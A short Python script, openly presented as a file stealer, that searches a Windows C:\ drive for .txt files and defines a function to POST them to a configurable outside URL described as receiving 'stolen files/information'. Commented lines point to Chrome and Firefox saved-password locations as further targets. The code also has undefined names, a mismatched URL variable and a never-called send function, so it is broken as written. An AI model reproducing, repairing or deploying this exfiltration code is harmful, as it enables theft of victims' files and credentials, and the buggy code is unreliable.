import os
import requests

URL = '0.0.0.0' # the URL/IP to which you want to send the stolen files/information to
#USERNAME = os.getlogin()
#GOOGLE_PASSWORDS = f'C:\Users\{USERNAME}\AppData\Local\Google\Chrome\User Data\Default' # location of Google passwords
#FIREFOX_PASSWORDS = f'C:\Users\{USERNAME}\AppData\Roaming\Mozilla\Firefox\Profiles\logins.json' # location of Firefox passwords

#file_types = ['.txt'] # if checking for multiple file types
files_found = [] # log files found

def file_search():
    for dir, sdirs, files in os.walk('C:\\'): # dir - directories, sdirs - subdirectories
        #print(f'directory: {dir}\n \ # for testing to show all files scanned
        #      subdirectories: {sdirs}\n \
        #      files: {files}')
        for file in files:
            #if any(type in file for type in file_types): # check for multiple file types of interest. if you want to use this, comment out the next line.
            if '.txt' in file:
                #print(dir + '\\' + file) # for testing
                files_found.append([dir,file]) # log the found found file's directory and name

def steal_file(address): # steal files
    file = {file : open(address, 'rb')} # convert the file to binary so it can be sent
    values = {FileName:''} # send the file name as a header so the server knows how to categorize it
    r = requests.post(url, files=file) # POST (send) the file


file_search()